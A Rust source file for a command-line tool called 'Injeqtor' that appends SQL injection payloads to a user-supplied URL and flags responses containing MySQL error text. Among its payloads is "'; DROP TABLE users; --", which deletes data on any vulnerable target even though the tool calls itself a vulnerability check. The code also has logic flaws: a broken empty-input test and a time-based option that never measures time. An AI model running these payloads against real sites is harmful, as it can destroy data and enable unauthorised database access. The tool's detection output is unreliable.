use std::io;
use tokio;
use reqwest::{Client};

#[tokio::main]
async fn main() {
    println!("Injeqtor");

    println!("Command Line Tools to check for SQL Injection vulnerability\n");

    let mut url = String::new();
    let mut payload_type = String::new();

    println!("Enter the URL");
    io::stdin().read_line(&mut url).expect("Unable to read URL");
    let url = url.trim().to_string();

    println!("\nChoose your payload");
    println!("1 - classical");
    println!("2 - time-based");
    println!("3 - blind");
    println!("4 - boolean\n");

    println!("Enter the payload type");
    io::stdin().read_line(&mut payload_type).expect("Unable to read payload type");
    let payload_type = payload_type.trim().to_string();

    if !url.is_empty() || !payload_type.is_empty() {
        if let Err(error) = validation_exist_sql_injection(&url, &payload_type).await {
            println!("Error when testing SQL injection: {}", error);
        }
    } else {
        println!("Fields cannot be empty");
    }
}

async fn validation_exist_sql_injection(url: &str, payload: &str) -> Result<(), reqwest::Error> {
    let client = Client::new();

    match payload {
        "1" => {
            let set_payloads = vec!["' OR '1'='1", "'; DROP TABLE users; --"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        },
        "2" => {
            let set_payloads = vec!["'; WAITFOR DELAY '00:00:05'--"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        },
        "3" => {
            let set_payloads = vec!["' AND 1=1 --", "' AND 1=0 --"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        },
        "4" => {
            let set_payloads = vec!["' OR 1=1 --", "' OR 1=0 --"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        }
        _ => println!("Options not found")
    }

    Ok(())
}

async fn response(client: Client, url: &str, payload: &str) -> Result<(), reqwest::Error> {
    let test_url = format!("{}{}", url, payload);
    println!("... Testing");

    let response = client.get(test_url).send().await?;

    if response.status().is_success() {
        let body = response.text().await?;

        if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
            println!("Using this URL it is possible to carry out a SQL Injection attack");
        } else {
            println!("No vulnerabilities found");
        }
    } else {
        println!("Failed to make the request")
    }

    Ok(())
}